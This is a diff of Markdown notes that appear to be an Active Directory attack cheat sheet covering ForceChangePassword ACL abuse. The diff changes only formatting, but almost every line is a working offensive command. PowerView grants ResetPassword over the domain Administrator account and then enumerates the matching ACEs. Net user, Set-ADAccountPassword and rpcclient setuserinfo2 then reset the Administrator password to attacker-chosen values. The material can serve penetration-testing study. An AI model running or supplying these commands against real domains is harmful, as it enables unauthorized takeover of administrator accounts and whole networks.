@@ -2,23 +2,34 @@
 ```
 GUID: 00299570-246d-11d0-a768-00aa006e0529
 Event IDs 4723, 4724
+```
 
-# Add ForceChangePassword ExtendedRights
+#### Add ForceChangePassword ExtendedRights
+```
 Add-DomainObjectAcl -TargetIdentity Administrator -PrincipalIdentity jkimmich -Rights ResetPassword
+```
 
-# All User
+#### All User
+```
 Get-DomainObjectAcl | Where-Object {$_.ObjectAceType -match "00299570-246d-11d0-a768-00aa006e0529"} | Select SecurityIdentifier,ObjectAceType | Out-GridView
+```
 
-# Specific User
+#### Specific User
+```
 Get-DomainObjectAcl  -Identity Administrator | Where-Object {$_.ObjectAceType -match "00299570-246d-11d0-a768-00aa006e0529"} | Select SecurityIdentifier,ObjectAceType | Out-GridView
+```
 
-# Change Password
+#### Change Password
+```
 net user Administrator YeniSifre123! /domain
 Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force) -Reset
+```
 
-# Change Password with RPC
+#### Change Password with RPC
+```
 rpcclient $> setuserinfo2 Administrator 24 'NewPassword123!'
 ```
+---
 
 # GenericAll
 ```
